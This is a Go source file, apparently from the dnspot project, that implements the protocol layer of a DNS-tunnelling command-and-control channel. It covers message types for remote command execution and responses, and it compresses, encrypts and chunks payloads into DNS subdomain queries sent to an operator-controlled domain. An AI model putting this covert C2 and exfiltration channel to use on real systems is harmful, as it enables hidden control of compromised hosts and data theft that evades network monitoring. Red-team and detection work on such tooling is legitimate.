package c2

import (
	"bytes"
	"compress/gzip"
	"errors"
	"fmt"
	"math/rand"
	"sort"
	"strings"
	"time"

	"github.com/lunixbochs/struc"
	"github.com/miekg/dns"
	"github.com/mosajjal/dnspot/cryptography"
)

const (
	PAYLOAD_SIZE         = int(70)
	CHUNK_SIZE           = uint8(90)
	CompressionThreshold = 1024 * 2 // 2KB
)

// MsgType defines the type of each message (healtcheck, synctime, execute command etc)
// This is different from CmdType
type MsgType uint8

// CmdType defines which type of work this tunnel with be. currently Exec and Echo are supported
type CmdType uint8

// Message codes
const (
	MessageHealthcheck MsgType = iota
	MessageSyncTime
	MessageExecuteCommand
	MessageExecuteCommandResponse
	MessageSetHealthInterval
)

const (
	// CommandExec execute command on the agents
	CommandExec CmdType = iota
	// CommandEcho is a chat system. Not echo lol
	CommandEcho
)

// healthCheck gets sent by the agent every n seconds
// show that the host is alive and it can receive further instructions
// as part of this healthCheck's response from the server
// note that we'll use the agent's public key as their ID, so no need to put it again here
// also we only have 69 bytes for the entire message if the subdomain is xx.xxx.xx (9 chars)
// multipart system:
// if ParentPartID = 0 -> single packet
// if ParentPartID != 0 -> incoming packets in the order of their PartID
// if IsLastPart == true -> last packet

// MessagePacket is the payload that will be on the wire for each DNS query and response
type MessagePacket struct {
	TimeStamp     uint32  `struc:"uint32,little"`
	PartID        uint16  `struc:"uint16,little"`
	ParentPartID  uint16  `struc:"uint16,little"`
	IsLastPart    bool    `struc:"bool,little"`
	MessageType   MsgType `struc:"uint8,little"`
	Command       CmdType `struc:"uint8,little"`
	PayloadLength uint8   `struc:"uint8,little,sizeof=Payload"`
	Payload       []byte  `struc:"[]byte,little"`
}

// MessagePacketWithSignature adds Signature to each packet separetely to help with reconstruction of packets
type MessagePacketWithSignature struct {
	Signature *cryptography.PublicKey
	Msg       MessagePacket
}

// PerformExternalAQuery is a very basic A query provider. TODO: this needs to move to github.com/mosajjal/dnsclient
func PerformExternalAQuery(Q string, server string) (*dns.Msg, error) {
	question := dns.Question{Name: Q, Qtype: dns.TypeA, Qclass: dns.ClassINET}
	c := new(dns.Client)
	c.Timeout = 6 * time.Second //todo: make this part of config
	m1 := new(dns.Msg)
	m1.SetEdns0(1500, false)
	m1.Id = dns.Id()
	m1.RecursionDesired = true
	m1.Question = make([]dns.Question, 1)
	m1.Question[0] = question
	in, _, err := c.Exchange(m1, server)
	return in, err
}

// inserNth takes a string and inserts a dot char every nth char.
// returns the number of dots inserted, plus the modified string
func insertNth(s string, n int) (int, string) {
	var buffer bytes.Buffer
	numberOfDots := 0
	var n1 = n - 1
	var l1 = len(s) - 1
	for i, rune := range s {
		buffer.WriteRune(rune)
		if i%n == n1 && i != l1 {
			numberOfDots++
			buffer.WriteByte('.') //dot char in DNS
			// buffer.WriteRune('.')
		}
	}
	return numberOfDots, buffer.String()
}

func split(buf []byte, lim int) [][]byte {
	var chunk []byte
	chunks := make([][]byte, 0, len(buf)/lim+1)
	for len(buf) >= lim {
		chunk, buf = buf[:lim], buf[lim:]
		chunks = append(chunks, chunk)
	}
	if len(buf) > 0 {
		chunks = append(chunks, buf[:])
	}
	return chunks
}

// PreparePartitionedPayload Gets a big payload that needs to be sent over the wire, chops it up into smaller limbs and creates a list of messages to be sent. It also sends the parentPartID to make sure the series
// of messages are not lost
func PreparePartitionedPayload(msg MessagePacket, payload []byte, dnsSuffix string, privateKey *cryptography.PrivateKey, serverPublicKey *cryptography.PublicKey) ([]string, uint16, error) {
	// TODO: fix duplicate sending

	// handle compression
	if len(payload) > CompressionThreshold {
		var b bytes.Buffer
		gz, _ := gzip.NewWriterLevel(&b, gzip.BestCompression)
		if _, err := gz.Write(payload); err != nil {
			panic(err)
		}
		if err := gz.Flush(); err != nil {
			panic(err)
		}
		if err := gz.Close(); err != nil {
			panic(err)
		}
		payload = b.Bytes()
	}

	var err error
	var response []string
	var parentPartID uint16 = 0
	// retryCount := 1 //todo: retry of >1 could cause message duplicates
	limbs := split(payload, int(CHUNK_SIZE))
	if len(limbs) > 1 {
		msg.IsLastPart = false
		msg.PartID = 0
		rand.Seed(time.Now().UnixNano())
		msg.ParentPartID = uint16(rand.Uint32()) + 1
		parentPartID = msg.ParentPartID
	}
	//todo: maybe a cap on the number of limbs here, as well as some progress logging inside the loop?
	for i := 0; i < len(limbs); i++ {
		// if retryCount == 0 {
		// 	return response, parentPartID, errors.New("failed to send message after 10 attempts")
		// }
		if i == len(limbs)-1 && len(limbs) > 1 {
			msg.IsLastPart = true
		}
		// msg.Payload = []byte{}
		// msg.PayloadLength = uint8(copy(msg.Payload[:], limbs[i]))
		msg.Payload = limbs[i]
		msg.PayloadLength = uint8(len(limbs[i]))
		var buf bytes.Buffer
		buf.Reset()
		if err := struc.Pack(&buf, &msg); err != nil {
			return response, parentPartID, err
		}
		encrypted, err := privateKey.Encrypt(serverPublicKey, buf.Bytes())
		if err != nil {
			return response, parentPartID, err
		}

		s := cryptography.EncodeBytes(encrypted)
		// padding
		// s = strings.ReplaceAll(s, "=", "")
		//todo: record number of dots as a char in the query
		numberofdots, fqdn := insertNth(s, 60)
		response = append(response, fqdn+"."+fmt.Sprint(numberofdots)+dnsSuffix)
		msg.PartID++
	}

	return response, parentPartID, err
}

// returns a list of subdomains from a dns message. if the msg type is answer, only answers are returned, otherwise only questions
func getSubdomainsFromDnsMessage(m *dns.Msg) []string {
	var res []string
	if len(m.Answer) > 0 {
		// for _, a := range m.Answer {
		// 	res = append(res, a.String())
		// }
		res1, _ := m.Answer[0].(*dns.CNAME)
		res = append(res, res1.Target)
	} else {
		for _, q := range m.Question {
			res = append(res, q.Name)
		}
	}
	return res
}

func DecryptIncomingPacket(m *dns.Msg, suffix string, privatekey *cryptography.PrivateKey, publickey *cryptography.PublicKey) ([]MessagePacketWithSignature, bool, error) {
	out := []MessagePacketWithSignature{}
	listOfSubdomains := getSubdomainsFromDnsMessage(m)

	for _, sub := range listOfSubdomains {
		if strings.HasSuffix(sub, suffix) {

			// verify incoming domain
			requestWithoutSuffix := strings.TrimSuffix(sub, suffix)
			if sub == requestWithoutSuffix {
				return out, true, errors.New("request does not have the correct suffix")
			}

			// remove the number of dots from FQDN
			lastSubdomainIndex := strings.LastIndex(requestWithoutSuffix, ".")
			if lastSubdomainIndex == -1 {
				return out, true, fmt.Errorf("subdomain count mismatch 1 %d %s", lastSubdomainIndex, requestWithoutSuffix) //todo:make this a better logic.
			}
			numberOfDots := requestWithoutSuffix[lastSubdomainIndex+1:]
			requestWithoutSuffix = requestWithoutSuffix[:lastSubdomainIndex]

			if fmt.Sprint(strings.Count(requestWithoutSuffix, ".")) != numberOfDots {
				return out, true, fmt.Errorf("subdomain count mismatch 2 %s %s", numberOfDots, requestWithoutSuffix) //todo:make this a better logic.
			}

			msgRaw := strings.Replace(requestWithoutSuffix, ".", "", -1)
			// // padding
			// if i := len(msgRaw) % 8; i != 0 {
			// 	msgRaw += strings.Repeat("=", 8-i)
			// }

			msg := cryptography.DecodeToBytes(msgRaw)
			// basic sanity check on msg length
			// commented this out since we're now using variable length
			// if len(msg) < 32 {
			// 	return out, true, errors.New("invalid request")
			// }
			// if err != nil {
			// 	return out, errors.New("invalid base36 input: %s", msgRaw)
			// }
			// verify signature
			decrypted, err := privatekey.Decrypt(msg)
			if err != nil {
				//todo: since a lot of these are noise and duplicates, maybe we can skip putting this as error
				// when a DNS client sends a request like a.b.c.d.myc2.com, some recurisve DNS
				// server don't pass that on to the NS server. instead, they start by sending
				// d.myc2.com, then c.d.myc2.com and so on, making our job quite difficult
				// log.Infof("%s, %s", msg, msgRaw) //todo:remove
				return out, false, err
			}

			// todo: verify authenticity with public key(s)
			o := MessagePacketWithSignature{}
			o.Signature = cryptography.GetPublicKeyFromMessage(msg)
			err = struc.Unpack(bytes.NewBuffer(decrypted), &o.Msg)
			if err != nil {
				return out, false, errors.New("couldn't unpack message")
			}
			out = append(out, o)
		}
	}
	return out, false, nil
}

// CheckMessageIntegrity gets a list of packets with their signatures
// and returns another packet list that are sorted, deduplicated and are complete
func CheckMessageIntegrity(packets []MessagePacketWithSignature) []MessagePacketWithSignature {
	//sort, uniq and remove duplicates. then check if the message is complete

	//sort
	sort.Slice(packets, func(i, j int) bool {
		return packets[i].Msg.PartID < packets[j].Msg.PartID
	})

	// unique
	for i := 0; i < len(packets)-1; i++ {
		if packets[i].Msg.PartID == packets[i+1].Msg.PartID {
			packets = append(packets[:i], packets[i+1:]...)
			i--
		}
	}
	// check if the message is complete
	if len(packets) == int(packets[len(packets)-1].Msg.PartID)+1 {
		return packets
	}
	return nil
}

// FNV1A a very fast hashing function, mainly used for de-duplication
func FNV1A(input []byte) uint64 {
	var hash uint64 = 0xcbf29ce484222325
	var fnvPrime uint64 = 0x100000001b3
	for _, b := range input {
		hash ^= uint64(b)
		hash *= fnvPrime
	}
	return hash
}
